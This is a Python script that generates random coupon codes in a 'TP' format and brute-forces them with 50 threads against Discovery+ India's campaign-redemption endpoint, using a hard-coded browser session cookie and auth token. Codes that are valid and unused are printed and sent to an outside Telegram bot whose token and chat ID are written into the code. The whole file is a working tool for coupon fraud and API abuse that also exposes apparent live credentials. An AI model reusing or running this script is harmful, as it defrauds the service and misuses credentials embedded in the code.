import concurrent.futures
import requests
import random
import string
from tqdm import tqdm
#####################GEN
def generate_random_code():
  code_format = "TP$$$$$$"
  code = ""

  for char in code_format:
    if char == "$":
      code += random.choice(string.ascii_uppercase + string.digits)
    else:
      code += char

  return code


def generate_multiple_codes(num_codes):
  codes = []

  for _ in range(num_codes):
    code = generate_random_code()
    codes.append(code)

  return codes


def save_codes_to_file(codes, filename):
  with open(filename, "w") as file:
    for code in codes:
      file.write(code + "\n")


num_codes_to_generate = int(input("Enter the number of codes to generate: "))
generated_codes = generate_multiple_codes(num_codes_to_generate)




save_codes_to_file(generated_codes, "armando" + ".txt")
##################################
url = "https://ap2-prod-direct.discoveryplus.in/monetization/campaigns"
coupon_file = "armando.txt"  # Path to the coupon codes file

headers = {
  "accept": "*/*",
  "accept-language": "en-US,en;q=0.9",
  "sec-ch-ua":
  "\"Google Chrome\";v=\"113\", \"Chromium\";v=\"113\", \"Not-A.Brand\";v=\"24\"",
  "sec-ch-ua-mobile": "?0",
  "sec-ch-ua-platform": "\"Windows\"",
  "sec-fetch-dest": "empty",
  "sec-fetch-mode": "cors",
  "sec-fetch-site": "same-site",
  "x-disco-client": "WEB:10:WEB_AUTH:",
  "x-disco-params": "realm=dplusindia",
  "cookie":
  "_bs=449c78e9-cfd0-97d0-fd5d-fd89d9c44b4c; kv_id=kw186b87fffb928; kv_install_sent=1685552885450; _gcl_aw=GCL.1685552886.Cj0KCQjw4NujBhC5ARIsAF4Iv6c-v3tZ9EUMr6BPkf-k0dHlaRAVd3vfAsXkNFWd0Mc3Kc2gGqEjBwgaAsH9EALw_wcB; _gcl_au=1.1.1311072903.1685552886; AMCVS_9AE0F0145936E3790A495CAA%40AdobeOrg=1; s_ecid=MCMID%7C36932975088556415702391987418728182077; s_ips=760; s_cc=true; AMCV_9AE0F0145936E3790A495CAA%40AdobeOrg=-637568504%7CMCIDTS%7C19509%7CMCMID%7C36932975088556415702391987418728182077%7CMCAAMLH-1686157685%7C12%7CMCAAMB-1686157685%7CRKhpRz8krg2tLO6pguXWp5olkAcUniQYPHaMWWgdJ3xzPWQmdj0y%7CMCOPTOUT-1685560086s%7CNONE%7CMCAID%7CNONE%7CvVersion%7C5.1.1; st=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJVU0VSSUQ6ZHBsdXNpbmRpYTo5NmFkNGQ0ZS01MzlhLTQzZDgtYmIyZS1iMjJiNjlhMDI4MjYiLCJqdGkiOiJ0b2tlbi00NmNhYTBlNi1hOGNlLTQyYjUtYTM4Ni01YjJhZjU4MjM2NTAiLCJhbm9ueW1vdXMiOmZhbHNlLCJpYXQiOjE2ODU1NTI5MDh9.9KRGdbNoJzeEqwiRlexTU-Pl6Jtd_LjCbQxOTo160Kk; gpv_Page=redeem; s_tp=760; s_ppv=https%253A%2F%2Fauth.discoveryplus.in%2Fredeem%2C100%2C100%2C760%2C1%2C1; s_plt=1.83; s_pltp=undefined; s_nr30=1685552946168-New; s_sq=discoverydpapacprod%3D%2526c.%2526a.%2526activitymap.%2526page%253Dhttps%25253A%25252F%25252Fauth.discoveryplus.in%25252Fredeem%2526link%253DContinue%2526region%253Dcontest-wrapper%2526.activitymap%2526.a%2526.c%2526pid%253Dhttps%25253A%25252F%25252Fauth.discoveryplus.in%25252Fredeem%2526oid%253DContinue%2526oidt%253D3%2526ot%253DSUBMIT",
  "Referer": "https://auth.discoveryplus.in/",
  "Referrer-Policy": "strict-origin-when-cross-origin"
}


def process_coupon(coupon_code):
  params = {
    "campaignCode": coupon_code,
  }

  response = requests.get(url, params=params, headers=headers)
  response_content = response.content.decode("utf-8")

  if "campaign.code.not.valid" not in response_content:
    if "campaign.code.already.used" not in response_content:
      print(f"Coupon Code: {coupon_code}")
      # print(f"Response: {response_content}")
      print("----[DISCOVERY+]---[3 MONTH]-------------")
      requests.get(
        f"""https://api.telegram.org/bot6260645401:AAFUZVqEW1YWkMPfsvT1MkNMjpkCLeLSBhQ/sendMessage?chat_id=5472724338&text="DISCOVERY FOUND COUPON CODE : {coupon_code}&parse_mode=html"""
      )

  # Update progress bar
  progress_bar.update()

with open(coupon_file, "r") as file:
  coupon_codes = file.read().splitlines()

total_coupons = len(coupon_codes)

# Use ThreadPoolExecutor for multithreading with 50 threads
with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
  # Create a progress bar
  progress_bar = tqdm(total=total_coupons, unit="coupon")

  # Submit each coupon for processing
  future_results = [
    executor.submit(process_coupon, coupon_code)
    for coupon_code in coupon_codes
  ]

  # Wait for all the tasks to complete
  concurrent.futures.wait(future_results)

  # Close the progress bar
  progress_bar.close()
